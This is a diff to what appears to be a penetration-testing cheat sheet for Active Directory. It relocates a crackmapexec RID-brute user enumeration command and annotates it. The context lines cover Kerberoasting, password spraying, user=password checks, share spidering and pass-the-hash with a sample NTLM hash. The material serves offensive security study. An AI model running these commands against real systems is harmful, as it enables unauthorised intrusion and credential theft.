@@ -369,6 +369,8 @@ targetedKerberoast.py -d <domain> -u <username> -p <password> --dc-ip <dc ip>
 sudo crackmapexec <protocol> <target ip> -u <user_list.txt> -p <password_list.txt>
 # testing user = password
 sudo crackmapexec <protocol> <target ip> -u <user_list.txt> -p <user_list.txt> --no-bruteforce
+# bruteforcing the RID (enumerate users)
+sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --rid-brute 10000
 # check password policy
 sudo crackmapexec <protocol> <target ip> --pass-pol
 # using existing credentials and users to find more credentials 
@@ -389,8 +391,6 @@ sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --local-
 sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --session
 # list readable share files
 sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> -M spider_plus
-# bruteforcing the RID
-sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --rid-brute 10000
 # using NTLM hash (NTDS.dit) to check credentials
 # e.g., Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8a3b1fee7718533175de682804c417a:::
 sudo crackmapexec smb <target ip(s)> -u <username> -H 'LM:NT'
